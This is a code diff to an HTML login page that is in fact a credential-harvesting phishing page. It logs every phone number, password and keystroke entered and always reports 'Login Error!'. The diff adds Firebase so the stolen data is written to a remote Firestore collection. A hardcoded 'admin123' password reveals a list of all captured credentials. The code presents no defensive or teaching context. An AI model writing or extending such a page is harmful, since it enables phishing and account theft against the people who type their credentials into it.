@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Page</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -25,7 +27,7 @@
             text-align: center;
             font-size: 18px;
             margin: 10px 0;
-            color: #c0392b; /* Red color for the warning sign */
+            color: #c0392b;
         }
 
         .login-container input {
@@ -48,7 +50,7 @@
         }
 
         .admin-container {
-            display: none; /* Hidden by default */
+            display: none;
         }
 
         #userList {
@@ -92,41 +94,19 @@
 </div>
 
 <script>
-    const users = []; // Array to store logged-in users and their keystrokes
+    // Your Firebase configuration
+    const firebaseConfig = {
+        apiKey: "YOUR_API_KEY",
+        authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+        projectId: "YOUR_PROJECT_ID",
+        storageBucket: "YOUR_PROJECT_ID.appspot.com",
+        messagingSenderId: "YOUR_SENDER_ID",
+        appId: "YOUR_APP_ID"
+    };
 
-    function login(event) {
-        event.preventDefault();
-        const phone = document.getElementById("phone").value;
-        const password = document.getElementById("password").value;
-
-        // Add user to the array regardless of credentials
-        users.push({ phone, password, keystrokesPhone: keystrokes.phone, keystrokesPassword: keystrokes.password });
-
-        // Display login error message
-        document.getElementById("loginMessage").innerText = "Login Error!";
-        document.getElementById("loginMessage").style.display = "block"; // Ensure message is visible
-
-        // Show admin view if the password is 'admin123'
-        if (password === "admin123") {
-            displayAdminView(); // Show admin view
-        }
-
-        // Optionally, reset the form fields
-        document.getElementById("loginForm").reset();
-    }
-
-    function displayAdminView() {
-        const userList = document.getElementById("userList");
-        userList.innerHTML = ""; // Clear previous list
-
-        users.forEach(user => {
-            const li = document.createElement("li");
-            li.innerText = `${user.phone} - ${user.password} - Typed Phone: ${user.keystrokesPhone}, Typed Password: ${user.keystrokesPassword}`;
-            userList.appendChild(li);
-        });
-
-        document.getElementById("adminContainer").style.display = "block"; // Show admin view
-    }
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore(app);
 
     const keystrokes = { phone: '', password: '' };
 
@@ -134,8 +114,47 @@
         keystrokes[inputName] += event.data || '';
     }
 
-    function getKeystrokes() {
-        return `Phone: ${keystrokes.phone}, Password: ${keystrokes.password}`;
+    async function login(event) {
+        event.preventDefault();
+        const phone = document.getElementById("phone").value;
+        const password = document.getElementById("password").value;
+
+        const user = { phone, password, keystrokesPhone: keystrokes.phone, keystrokesPassword: keystrokes.password };
+        
+        await saveUserToFirestore(user); // Save user data to Firestore
+
+        document.getElementById("loginMessage").innerText = "Login Error!";
+        document.getElementById("loginMessage").style.display = "block"; // Ensure message is visible
+
+        if (password === "admin123") {
+            displayAdminView(); // Show admin view
+        }
+
+        document.getElementById("loginForm").reset();
+    }
+
+    async function saveUserToFirestore(user) {
+        try {
+            await db.collection("users").add(user);
+            console.log('User data saved successfully');
+        } catch (error) {
+            console.error("Error saving user data: ", error);
+        }
+    }
+
+    async function displayAdminView() {
+        const userList = document.getElementById("userList");
+        userList.innerHTML = ""; // Clear previous list
+
+        const snapshot = await db.collection("users").get();
+        snapshot.forEach(doc => {
+            const user = doc.data();
+            const li = document.createElement("li");
+            li.innerText = `${user.phone} - ${user.password} - Typed Phone: ${user.keystrokesPhone}, Typed Password: ${user.keystrokesPassword}`;
+            userList.appendChild(li);
+        });
+
+        document.getElementById("adminContainer").style.display = "block"; // Show admin view
     }
 </script>
 
